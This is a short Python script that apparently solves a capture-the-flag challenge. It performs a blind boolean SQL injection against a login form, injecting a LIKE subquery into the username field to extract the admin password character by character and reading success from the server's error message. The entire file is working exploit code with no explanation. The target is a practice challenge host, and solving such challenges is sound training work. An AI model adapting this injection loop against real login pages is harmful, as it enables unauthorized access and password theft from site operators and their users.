import requests

flag = "flag{"
while True:
    for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_":
        
        query = "admin' and (SELECT 1 FROM users WHERE username = 'admin' AND password LIKE '{}') = 1 -- ".format(flag + char + "%}")
        
        data = {"username": query, "password": "i don't know"}
        
        print("select password from users where username = '" + data["username"] + "'")
        
        r = requests.post("http://adultlogin.challs.havce.it:31345", data=data)
        
        print(r.text)
        
        if "Wrong username" not in r.text:
            flag += char
            print(flag)
            break
    else:
        break
    
print("Final flag:", flag)
